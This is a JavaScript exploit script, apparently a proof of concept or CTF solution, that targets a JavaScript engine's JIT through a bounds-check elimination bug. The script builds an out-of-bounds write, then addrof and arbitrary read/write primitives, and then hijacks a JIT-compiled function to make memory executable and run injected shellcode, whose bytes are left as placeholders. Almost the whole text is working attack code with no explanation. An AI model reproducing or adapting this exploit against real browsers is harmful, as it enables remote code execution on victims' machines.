var reader = new BigUint64Array(0x1000);
var a = new Array(0x40);
a.fill(1.1);
var b = new Array(0x40);
b.fill(2.2);
var c = new Array(0x40);
c.fill(3.3);
c.slot0 = itod(0x0000000000000000n)
c.slot1 = 3.3
c.slot2 = itod(0x0000000000000000n)

var uh = [];
var x = [1.1, 2.2, , 4.4];
x.__defineSetter__("-1", function() {
    a.length = 0;
    b.length = 0;
    c.length = 0;
    // Adding a bunch of persistent objects seems to work better than
    // just garbage collecting here. Not sure why.
    for (var i = 0; i < 0x800; i++) {
        uh.push(new Array(0x10));
    }
});

function pwn(idx, arg2, arg3, arg4) {
    // Step 1: Write here to add a bounds check for GVN to elim against
	a[arg2] = 1;
    a[arg2 - 1] = 1;

    // Step 2: Edit the size of 'a' and reallocate it
	x[idx] = 3.3;

    // OOB write to 'a;, since GVN thinks a's size is still the same.
    a[arg2 - 1] = arg3;
	a[arg2] = arg4;
}

const offset = 11;
for (var i = 0; i < 100000; i++) {
	x.length = 4;
	pwn(5, offset, 1.1, 1.1);
}

x.length = 4;
// Overwrite the size/capacity/initLength of b (was 0/0/6, now 0x10/0x10/0x10)
let new_size = 0x10n;
pwn(-1, offset, itod(new_size << 32n | new_size), itod(new_size));
// Now B's size is 0x10, and we can read/write OOB relative to B.

// Get a pointer to c's slots
var c_slot = dtoi(b[8]);
log("c_slot        : " + hex(c_slot));

if (c_slot === 0x7ff8000000000000n) {
    throw "[-] failed to leak c slot";
}

// JIT mprotector now, since we can't do this from eval context
const mprotector = (x) => [ /* MPROTECTOR_GOES_HERE */];
const eggs = [ /* MPROTECTOR_GOES_HERE */];
for (var i = 0; i < 100000; i+=1)
    mprotector(1.1);

// For some reason 'b' moves if the following code is _not_ in eval.
eval(`
function weak_read(addr) {
    var orig = b[8];
    b[8] = itod(addr);
    var ret = dtoi(c.slot0);
    b[8] = orig;
    return ret;
}

function addrof(obj) {
    var orig = c.slot1;
    c.slot1 = obj;
    var lower = weak_read(c_slot + 4n) >> 32n;
    var upper = (weak_read(c_slot + 12n) << 32n) & 0x0000ffffffffffffn;
    var pointer = (upper | lower);
    c.slot1 = orig;
    return pointer
}

function weak_write(addr, val) {
    var orig = b[8];
    b[8] = itod(addr);
    c.slot0 = itod(val);
    b[8] = orig;
}

var pReader = addrof(reader);
log("addrof reader : " + hex(pReader));
var pReaderBacking = pReader + 0x38n;
log("pReaderBacking: " + hex(pReaderBacking));

function r64(addr) {
    weak_write(pReaderBacking, addr);
    return reader[0];
}

function w64(addr, val) {
    weak_write(pReaderBacking, addr);
    reader[0] = val;
}

////////////////////////////////////////////////////////////////////////////////
// Step 2: stage some shellcode
var shellcode = [/* SHELLCODE_GOES_HERE */];

var page = new Uint8Array(0x1000);
var pPage = addrof(page);
console.log("page          : " + hex(pPage));
var pBackingPage = pPage + 0x38n;
var backingPage = r64(pBackingPage);
console.log("BackingPage   : " + hex(pBackingPage) + " -> " + hex(backingPage));

var pMprotector = addrof(mprotector);
console.log("func          : " + hex(pMprotector))

var pppCode = pMprotector + 0x30n;
var ppCode = r64(pppCode);
var pCode = r64(ppCode);
console.log("Code          : " + hex(pppCode) + " -> " + hex(ppCode) + " -> " + hex(pCode));

var start = pCode;
start = start & 0xfffffffffffff000n;
start -= 0x4000n;
var pJitCode = egghunt(start, start + 0x100000n, eggs[0], eggs[1], step=0x8n);
if (pJitCode == -1) {
    console.log("Failed to find JIT code");
} else {
    pJitCode = pJitCode + 0x10n;
    console.log("Found mprotect: " + hex(pJitCode));
    w64(ppCode, pJitCode);

    // Make the backing page RWX
    mprotector(itod(backingPage));

    // Copy the shellcode to the backing page
    for (var i = 0; i < shellcode.length; i++) {
        page[i] = shellcode[i];
    }

    // Trigger the shellcode
    log("Triggering shellcode")
    w64(ppCode, backingPage)
    mprotector(1.1);
}
`);
